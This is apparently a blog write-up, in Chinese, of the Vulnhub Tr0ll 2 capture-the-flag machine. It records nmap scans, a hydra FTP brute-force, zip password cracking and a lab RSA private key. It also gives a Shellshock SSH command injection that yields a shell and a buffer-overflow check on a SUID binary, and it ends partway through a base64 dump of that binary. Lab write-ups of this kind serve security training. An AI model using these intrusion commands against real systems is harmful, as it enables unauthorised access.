---
title: Vulnhub-Tr0ll 2 half
published: 2025-03-09 16:17:52
tags: [Vulnhub]
category: 靶机
draft: false
---

# Tr0ll: 2 half

> [https://www.vulnhub.com/entry/tr0ll-2,107/](https://www.vulnhub.com/entry/tr0ll-2,107/)
> 

## 主机发现端口扫描

1. 探测存活主机，`155`为靶机
    
    ```php
    nmap -sP 192.168.75.0/24
    //
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-27 11:02 CST
    Nmap scan report for 192.168.75.1
    Host is up (0.00042s latency).
    MAC Address: 00:50:56:C0:00:08 (VMware)
    Nmap scan report for 192.168.75.2
    Host is up (0.00053s latency).
    MAC Address: 00:50:56:FB:CA:45 (VMware)
    Nmap scan report for 192.168.75.155
    Host is up (0.00018s latency).
    MAC Address: 00:0C:29:F7:66:43 (VMware)
    Nmap scan report for 192.168.75.254
    Host is up (0.00022s latency).
    MAC Address: 00:50:56:FB:E7:F4 (VMware)
    Nmap scan report for 192.168.75.151
    Host is up.
    ```
    
2. 扫描主机所有端口
    
    ```php
    nmap -sT -min-rate 10000 -p- 192.168.75.155
    //
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-27 11:07 CST
    Nmap scan report for 192.168.75.155
    Host is up (0.013s latency).
    Not shown: 65532 closed tcp ports (conn-refused)
    PORT   STATE SERVICE
    21/tcp open  ftp
    22/tcp open  ssh
    80/tcp open  http
    MAC Address: 00:0C:29:F7:66:43 (VMware)
    ```
    
3. 扫描服务版本及系统版本
    
    ```php
    nmap -sT -sV -O -p21,22,80 192.168.75.155
    //
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-27 11:10 CST
    Nmap scan report for 192.168.75.155
    Host is up (0.00054s latency).
    
    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     vsftpd 2.0.8 or later
    22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
    80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
    MAC Address: 00:0C:29:F7:66:43 (VMware)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Linux 2.6.X|3.X
    OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
    OS details: Linux 2.6.32 - 3.10
    Network Distance: 1 hop
    Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```
    
4. 扫描漏洞
    
    ```sql
    nmap -script=vuln -p22,21,80 192.168.75.155
    //
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-27 11:10 CST
    Nmap scan report for 192.168.75.155
    Host is up (0.00039s latency).
    
    PORT   STATE SERVICE
    21/tcp open  ftp
    22/tcp open  ssh
    80/tcp open  http
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    | http-enum: 
    |_  /robots.txt: Robots file
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    MAC Address: 00:0C:29:F7:66:43 (VMware)
    ```
    

## FTP - 1

1. 尝试了anonymous，发现没启动匿名登陆

## web

1. 访问主页，有一张图片（Trollface，才知道靶机命名是以这个来的），内容：`ME AGAIN LOL` 。。
    
    F12打开有文字 `Nothing here, Try Harder!><!--Author: Tr0ll><!--Editor: VIM>`
    
2. `nmap`扫描出了`robots.txt` ,尝试访问，是一些目录
    
    ```sql
    User-agent:*
    Disallow:
    /noob
    /nope
    /try_harder
    /keep_trying
    /isnt_this_annoying
    /nothing_here
    /404
    /LOL_at_the_last_one
    /trolling_is_fun
    /zomg_is_this_it
    /you_found_me
    /I_know_this_sucks
    /You_could_give_up
    /dont_bother
    /will_it_ever_end
    /I_hope_you_scripted_this
    /ok_this_is_it
    /stop_whining
    /why_are_you_still_looking
    /just_quit
    /seriously_stop
    ```
    
    只有 `/noob ,/dont_bother, /keep_trying` 存在照片，一样的照片，均使用binwalk分离没分离出文件，下载`/dont_bother` 里的照片使用`010editor`打开，翻到最下面发现文字
    
    ```sql
    Look Deep within y0ur_self for the answer
    ```
    
    什么车轱辘话，我看这个`y0ur_self`就很不对劲，访问果然，存在`answer.txt` ，里面的内容是好多好多的base64编码
    
3. `answer.txt` 看着像是要我们fuzz，我们首先将base64解码保存为`fuzz.txt`然后对主页进行`fuzz` ，无结果
    
    ```sql
    base64 -d answer.txt > fuzz.txt
    
    wfuzz -c -w fuzz.txt --hh 110 http://192.168.75.155/?FUZZ=som
    ```
    

## 爆破

尝试`hydra`爆破`ftp`

```sql
hydra 192.168.75.155 -s 21 ftp -L fuzz.txt -P fuzz.txt -V
```

完全爆破不出来呢

尝试弱口令 `tr0ll`   ，登陆成功。。

## FTP - 2

1. 目录下有一个`lmao.zip`的压缩包，下载，解压需要密码，可能是上面的密码本
2. 使用`fcrackzip` 查看帮助编写命令
    
    ```sql
    fcrackzip -u -D -p fuzz.txt lmao.zip
    
    PASSWORD FOUND!!!!: pw == ItCantReallyBeThisEasyRightLOL
    ```
    
    破解成功的到密码`ItCantReallyBeThisEasyRightLOL`
    
3. 解压后得到文件`noob` ，是个RSA私钥
    
    ```sql
    -----BEGIN RSA PRIVATE KEY-----
    MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
    yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
    /9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo
    q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5
    z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy
    e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna
    u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0
    gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq
    UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079
    La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR
    xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP
    aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW
    K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx
    n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB
    TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh
    WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv
    ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t
    0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq
    vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh
    ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG
    th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s
    G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye
    q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO
    vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG
    zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g==
    -----END RSA PRIVATE KEY----- 
    ```
    
4. 是通过RSA私钥登录ssh？

## SSH

1. 尝试使用RSA登录
    
    ps：假如遇到`sign_and_send_pubkey: no mutual signature supported`，在`~/.ssh/config` 里面添加`PubkeyAcceptedKeyTypes +ssh-rsa` 即可
    
    ```sql
    sh -i noob noob@192.168.75.155                                                       
    TRY HARDER LOL!
    Connection to 192.168.75.155 closed.
    ```
    
    依旧不行，不会了，查看WP说是要使用`shellshock`
    
    > [https://xz.aliyun.com/t/14742](https://xz.aliyun.com/t/14742?time__1311=GqAh7Iq%2Box%2FD7830%3DDOIm3AKRlgxRrbD&u_atoken=9f3a46244095314eb0a9c855b3b8ffef&u_asig=0a472f9117274258401631677e0067#toc-6)
    > 
    
    ```sql
    ssh  noob@192.168.75.155 -i noob -t '() { :;}; /bin/bash'
    ```
    
    会变为`↓`系统误当`() { :;};` 为函数环境变量
    
    ```sql
    () { :;};  // 空函数
    /bin/bash
    ```
    
    输入后得到`shell` 
    

## 提权

1. 查看权限
    
    ```sql
    ssh  noob@192.168.75.155 -i noob '() { :;}; /bin/bash'    
    //                                                                               
    python -c 'import pty;pty.spawn("/bin/bash")'
    //
    noob@Tr0ll2:~$ whoami
    noob
    //
    noob@Tr0ll2:~$ uname -a
    Linux Tr0ll2 3.2.0-29-generic-pae #46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012 i686 i686 i386 GNU/Linux
    ```
    
2. 枚举信息
    
    ```sql
    noob@Tr0ll2:~$ find / -perm -u=s -type f 2>/dev/null
    /bin/su
    /bin/umount
    /bin/ping
    /bin/mount
    /bin/fusermount
    /bin/ping6
    /usr/bin/chfn
    /usr/bin/at
    /usr/bin/newgrp
    /usr/bin/sudoedit
    /usr/bin/passwd
    /usr/bin/mtr
    /usr/bin/sudo
    /usr/bin/chsh
    /usr/bin/traceroute6.iputils
    /usr/bin/gpasswd
    /usr/sbin/pppd
    /usr/sbin/uuidd
    /usr/lib/eject/dmcrypt-get-device
    /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
    /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
    /usr/lib/pt_chown
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /usr/lib/openssh/ssh-keysign
    /nothing_to_see_here/choose_wisely/door2/r00t
    /nothing_to_see_here/choose_wisely/door3/r00t
    /nothing_to_see_here/choose_wisely/door1/r00t
    //
    noob@Tr0ll2:~$ cat /etc/passwd
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/bin/sh
    bin:x:2:2:bin:/bin:/bin/sh
    sys:x:3:3:sys:/dev:/bin/sh
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/bin/sh
    man:x:6:12:man:/var/cache/man:/bin/sh
    lp:x:7:7:lp:/var/spool/lpd:/bin/sh
    mail:x:8:8:mail:/var/mail:/bin/sh
    news:x:9:9:news:/var/spool/news:/bin/sh
    uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
    proxy:x:13:13:proxy:/bin:/bin/sh
    www-data:x:33:33:www-data:/var/www:/bin/sh
    backup:x:34:34:backup:/var/backups:/bin/sh
    list:x:38:38:Mailing List Manager:/var/list:/bin/sh
    irc:x:39:39:ircd:/var/run/ircd:/bin/sh
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
    nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
    libuuid:x:100:101::/var/lib/libuuid:/bin/sh
    syslog:x:101:103::/home/syslog:/bin/false
    messagebus:x:102:104::/var/run/dbus:/bin/false
    maleus:x:1000:1000:Tr0ll,,,:/home/maleus:/bin/bash
    sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
    ftp:x:104:111:ftp daemon,,,:/srv/ftp:/bin/false
    noob:x:1002:1002::/home/noob:/bin/bash
    Tr0ll:x:1001:1001::/home/tr0ll:/bin/false
    ....
    ```
    
    没找到什么可以提权
    
3. 看着目录 
    
    ```python
    /nothing_to_see_here/choose_wisely/door2/r00t
    /nothing_to_see_here/choose_wisely/door3/r00t
    /nothing_to_see_here/choose_wisely/door1/r00t
    ```
    
    有点怪怪的，并且拥有sudo权限
    
    ```python
    $ ./r00t
    ./r00t
    Usage: ./r00t input
    ```
    
    让我们输入字符，我们判断是否存在缓冲区溢出漏洞
    

## 验证缓冲区溢出漏洞

1. 输入 300个A尝试
    
    ```python
    $ ./r00t $(python -c "print 'A'*300")
    ./r00t $(python -c "print 'A'*300")
    Segmentation fault
    ```
    
    `Segmentation fault` 发现缓冲区溢出漏洞（出现这个错误要立马进行base64编码，其他两个文件夹也有别的r00t文件，是恶搞的，会一段时间随机交换）
    
2. 将文件传到本地进行测试
    
    ```python
    base64 r00t
    //
    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
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/////AAAAAP////8AAAAA
    AAAAAAEAAAAQAAAADAAAAPSCBAgNAAAAXIUECPX+/2+sgQQIBQAAADyCBAgGAAAAzIEECAoAAABY
    AAAACwAAABAAAAAVAAAAAAAAAAMAAAD0nwQIAgAAACgAAAAUAAAAEQAAABcAAADMggQIEQAAAMSC
    BAgSAAAACAAAABMAAAAIAAAA/v//b6SCBAj///9vAQAAAPD//2+UggQIAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACifBAgAAAAAAAAAAEaDBAhWgwQI
    ZoMECHaDBAiGgwQIAAAAAAAAAABHQ0M6IChVYnVudHUvTGluYXJvIDQuNi4zLTF1YnVudHU1KSA0
    LjYuMwAcAAAAAgAAAAAABAAAAAAARIQECGMAAAAAAAAAAAAAABEBAAACAAAAAAAEAUoAAAABcwAA
    AD8AAABEhAQIp4QECAAAAAACBAcfAAAAAgEILAAAAAICB1sAAAACBAcaAAAAAgEGLgAAAAICBXkA
    AAADBAVpbnQAAggFAAAAAAIIBxUAAAACBAUFAAAABARxAAAAAgEGNQAAAAQEfgAAAAVxAAAABgE6
    AAAAAQMBTwAAAESEBAinhAQIAAAAAAIBAAAHVgAAAAEDTwAAAAKRAAeDAAAAAQMCAQAAApEECGJ1
    ZgABBQgBAAACdBAJAQ4AAAACAAFrAAAAAecAAAAKawAAAAp4AAAAAAtWhAQIeIQECAwBbgAAAAIA
    AQEKTwAAAAAAAAQEawAAAA1xAAAADiUAAAD/AAABEQElDhMLAw4bDhEBEgEQBgAAAiQACws+CwMO
    AAADJAALCz4LAwgAAAQPAAsLSRMAAAUmAEkTAAAGLgE/DAMOOgs7CycMSRMRARIBQAYBEwAABwUA
    Aw46CzsLSRMCCgAACDQAAwg6CzsLSRMCCgAACS4BPwwDDjoLOwsnDEkTPAwBEwAACgUASRMAAAsL
    AREBEgEAAAwuAT8MAw46CzsLJww8DAAADQEBSRMAAA4hAEkTLwsAAABGAAAAAgAqAAAAAQH7Dg0A
    AQEBAQAAAAEAAAEAYm9mLmMAAAAAPGJ1aWx0LWluPgAAAAAAAAUCRIQECBS+aAhZvgh1CEsCAgAB
    AWxvbmcgbG9uZyBpbnQAc3RyY3B5AGxvbmcgbG9uZyB1bnNpZ25lZCBpbnQAdW5zaWduZWQgY2hh
    cgBtYWluAC9ob21lL25vb2IAR05VIEMgNC42LjMAYXJnYwBzaG9ydCB1bnNpZ25lZCBpbnQAZXhp
    dABib2YuYwBzaG9ydCBpbnQAYXJndgAAAAAAAQAAAAIAdAQBAAAAAwAAAAIAdAgDAAAAYgAAAAIA
    dQhiAAAAYwAAAAIAdAQAAAAAAAAAAAAuc3ltdGFiAC5zdHJ0YWIALnNoc3RydGFiAC5pbnRlcnAA
    Lm5vdGUuQUJJLXRhZwAubm90ZS5nbnUuYnVpbGQtaWQALmdudS5oYXNoAC5keW5zeW0ALmR5bnN0
    cgAuZ251LnZlcnNpb24ALmdudS52ZXJzaW9uX3IALnJlbC5keW4ALnJlbC5wbHQALmluaXQALnRl
    eHQALmZpbmkALnJvZGF0YQAuZWhfZnJhbWVfaGRyAC5laF9mcmFtZQAuY3RvcnMALmR0b3JzAC5q
    Y3IALmR5bmFtaWMALmdvdAAuZ290LnBsdAAuZGF0YQAuYnNzAC5jb21tZW50AC5kZWJ1Z19hcmFu
    Z2VzAC5kZWJ1Z19pbmZvAC5kZWJ1Z19hYmJyZXYALmRlYnVnX2xpbmUALmRlYnVnX3N0cgAuZGVi
    dWdfbG9jAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGwAAAAEAAAAC
    AAAAVIEECFQBAAATAAAAAAAAAAAAAAABAAAAAAAAACMAAAAHAAAAAgAAAGiBBAhoAQAAIAAAAAAA
    AAAAAAAABAAAAAAAAAAxAAAABwAAAAIAAACIgQQIiAEAACQAAAAAAAAAAAAAAAQAAAAAAAAARAAA
    APb//28CAAAArIEECKwBAAAgAAAABQAAAAAAAAAEAAAABAAAAE4AAAALAAAAAgAAAMyBBAjMAQAA
    cAAAAAYAAAABAAAABAAAABAAAABWAAAAAwAAAAIAAAA8ggQIPAIAAFgAAAAAAAAAAAAAAAEAAAAA
    AAAAXgAAAP///28CAAAAlIIECJQCAAAOAAAABQAAAAAAAAACAAAAAgAAAGsAAAD+//9vAgAAAKSC
    BAikAgAAIAAAAAYAAAABAAAABAAAAAAAAAB6AAAACQAAAAIAAADEggQIxAIAAAgAAAAFAAAAAAAA
    AAQAAAAIAAAAgwAAAAkAAAACAAAAzIIECMwCAAAoAAAABQAAAAwAAAAEAAAACAAAAIwAAAABAAAA
    BgAAAPSCBAj0AgAALgAAAAAAAAAAAAAABAAAAAAAAACHAAAAAQAAAAYAAAAwgwQIMAMAAGAAAAAA
    AAAAAAAAABAAAAAEAAAAkgAAAAEAAAAGAAAAkIMECJADAADMAQAAAAAAAAAAAAAQAAAAAAAAAJgA
    AAABAAAABgAAAFyFBAhcBQAAGgAAAAAAAAAAAAAABAAAAAAAAACeAAAAAQAAAAIAAAB4hQQIeAUA
    ABwAAAAAAAAAAAAAAAQAAAAAAAAApgAAAAEAAAACAAAAlIUECJQFAAA0AAAAAAAAAAAAAAAEAAAA
    AAAAALQAAAABAAAAAgAAAMiFBAjIBQAAxAAAAAAAAAAAAAAABAAAAAAAAAC+AAAAAQAAAAMAAAAU
    nwQIFA8AAAgAAAAAAAAAAAAAAAQAAAAAAAAAxQAAAAEAAAADAAAAHJ8ECBwPAAAIAAAAAAAAAAAA
    AAAEAAAAAAAAAMwAAAABAAAAAwAAACSfBAgkDwAABAAAAAAAAAAAAAAABAAAAAAAAADRAAAABgAA
    AAMAAAAonwQIKA8AAMgAAAAGAAAAAAAAAAQAAAAIAAAA2gAAAAEAAAADAAAA8J8ECPAPAAAEAAAA
    AAAAAAAAAAAEAAAABAAAAN8AAAABAAAAAwAAAPSfBAj0DwAAIAAAAAAAAAAAAAAABAAAAAQAAADo
    AAAAAQAAAAMAAAAUoAQIFBAAAAgAAAAAAAAAAAAAAAQAAAAAAAAA7gAAAAgAAAADAAAAHKAECBwQ
    AAAIAAAAAAAAAAAAAAAEAAAAAAAAAPMAAAABAAAAMAAAAAAAAAAcEAAAKgAAAAAAAAAAAAAAAQAA
    AAEAAAD8AAAAAQAAAAAAAAAAAAAARhAAACAAAAAAAAAAAAAAAAEAAAAAAAAACwEAAAEAAAAAAAAA
